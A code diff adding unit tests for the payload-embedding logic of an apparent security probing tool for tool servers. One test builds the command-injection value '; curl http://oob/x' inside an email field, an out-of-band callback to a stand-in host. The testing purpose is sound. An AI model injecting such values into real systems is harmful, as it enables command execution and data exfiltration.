@@ -47,3 +47,17 @@ def test_tool_baseline_holds_latency_and_response():
     b = ToolBaseline(latency=0.42, response="hello")
     assert b.latency == 0.42
     assert b.response == "hello"
+
+
+def test_injection_point_embed_prefixes_valid_value():
+    from mcprobe.models import InjectionPoint
+    p = InjectionPoint(tool="t", json_path="email",
+                       base_args={"email": "probe@mcprobe.example"}, param_name="email")
+    out = p.embed("; curl http://oob/x")
+    assert out["email"] == "probe@mcprobe.example; curl http://oob/x"
+
+
+def test_injection_point_embed_empty_when_leaf_absent():
+    from mcprobe.models import InjectionPoint
+    p = InjectionPoint(tool="t", json_path="missing", base_args={}, param_name="missing")
+    assert p.embed("PAY")["missing"] == "PAY"
